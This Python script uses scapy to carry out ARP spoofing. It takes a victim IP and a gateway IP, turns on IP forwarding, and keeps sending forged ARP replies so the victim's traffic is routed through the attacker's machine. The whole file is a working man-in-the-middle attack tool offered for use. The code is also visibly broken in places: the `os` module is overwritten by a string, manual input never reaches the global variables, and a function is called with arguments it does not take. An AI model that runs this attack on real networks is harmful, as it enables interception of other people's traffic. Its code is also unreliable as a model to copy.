import sys, os, time
import platform as platform_module
import scapy.all as scapy

interface = ""
victimIP = ""
gateIP = ""

def get_MAC(ip, interface):
	answer, unanswer = scapy.srp(scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst = ip), timeout = 2, iface=interface, inter = 0.1)
	for send,recieve in answer:
		return recieve.sprintf(r"%Ether.src%")


def reassignARP():
	print("[*] Reassigning ARPS...")
	victimMAC = get_MAC(victimIP, interface)
	routerMAC = get_MAC(gateIP, interface)
	scapy.send(scapy.ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC, retry=7))
	scapy.send(scapy.ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC, retry=7))
	print("[+] Success!")

def attack(victimIP, victimMAC, routerIP, routerMAC):
	scapy.send(scapy.ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
	scapy.send(scapy.ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))

def get_input():
	try:
		interface = input("[*] Enter Interfaces: ")
		victimIP = input("[*] Enter Victim IP:")
		gateIP = input("[*] Enter Gateway IP: ")
	except KeyboardInterrupt:
		print("[-] Detected Ctrl+C")
		print("[-] Exiting..")
		exit(1)
	except:
		print("[!] Unknown Error!")
		exit(1)

def print_usage():
	print("""
Usage: [program name] [arguments] [interface] [victimIP] [gatewayIP]
--help: displays this help message
-m: manual input (if you select this option, you do not need to input the interface, victimIP, nor the gateIP through the arguments)
	   """)
	exit(1)

def main():
	if "-m" in sys.argv:
		get_input()
	else:
		interface = sys.argv[1]
		victimIP = sys.argv[2]
		gateIP = sys.argv[3]

	os = platform_module.system()
	print("[*] Platform:\t%s"%os)
	if os == "Linux":
		print("\n\n[*] Enabling IP Forwarding (Only works for linux!!!)")
		try:
			os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
		except:
			print("[!] Fatal Error: Could not enable IP Forwarding")
			exit(1)
	elif os == "Windows":
		print("[!] Error: Cannot enable IP forwarding\n[*] Open regedit and go to HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters then modify the value of the parameter IPEnableRouter to 1\n[!] Exiting...\n")
	elif os == "macosx":
		os.system('sysctl -w net.inet.ip.forwarding=1')
	else:
		print("[!] Error: unknown Operating System\n[!] Exiting...\n")
		exit(1)
	
	try:
		victimMAC = get_MAC(victimIP, interface)
	except Exception as e:
		print("[!] Error getting victim MAC")
		print(e)
		sys.exit(1)

	try:
		routerMAC = get_MAC(gateIP, interface)
	except Exception as e:
		print("[!] Error getting router MAC")
		print(e)
		sys.exit(1)
	
	print("[*] Victim MAC: %s" % victimMAC)
	print("[*] Router MAC: %s" % routerMAC)
	print("[*] Attacking")
	while True:
		try:
			attack(victimIP, victimMAC, gateIP, routerMAC)
			time.sleep(1)
		except KeyboardInterrupt:
			reassignARP(victimIP, gateIP, interface)
			break
	sys.exit(1)
	

if __name__ == "__main__":
	if "--help" in sys.argv:
		print_usage()
	if (len(sys.argv) == 4) or (len(sys.argv) == 2 and sys.argv[1] == "-m"):
		main()
	else:
		print_usage()